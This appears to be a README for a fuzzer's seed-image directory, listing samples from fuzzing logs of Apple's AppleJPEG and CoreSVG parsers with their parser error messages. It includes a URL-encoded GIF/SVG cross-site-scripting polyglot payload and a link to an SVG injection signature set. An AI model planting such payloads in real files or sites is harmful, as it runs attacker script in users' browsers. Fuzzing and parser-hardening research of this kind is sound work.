# Images Directory for Seeding Fuzzer
## Looking for Errors
Samples from Fuzzing Logs

### Sample 1
#### Example Instrumented module AppleJPEG
PoC: xss.gif
```
GIF89a%3a%2f%2a%3c%73%76%67%2f%6f%6e%6c%6f%61%64%3d%61%6c%65%72%74%28%31%29%3e%2a%2f%3d%61%6c%65%72%74%28%64%6f%63%75%6d%65%6e%74%2e%64%6f%6d%61%69%6e%29%2f%2f%3b
```
#### Nugget for Function Targeting
```
Failed to parse viewBox for node name "svg"CoreSVG: Error: SVGShapeNode: Error parsing atom: cx
```
### Sample 2
#### Example Instrumented module AppleJPEG
PoC: https://raw.githubusercontent.com/xsscx/Commodity-Injection-Signatures/master/svg/xss-xml-svg-font-example-poc-7.svg
#### Nugget for Function Targeting
```
Failed to parse viewBox for node name "svg"CoreSVG: Error: SVGShapeNode: Error parsing atom: cy
```
### Sample 3
#### Example Instrumented module CoreSVG
PoC: Namespace XSS
#### Nugget for Function Targeting
```
namespace error : xmlns: 'http://wwwHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH{{{{{{{{{{{{{{{{{{{{{{{{{{{{{lert('script')' is not a valid URI
//wwwHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH{{{{{{{{{{{{{{{{{{{{{{{{{{{{{lert('script')"
```
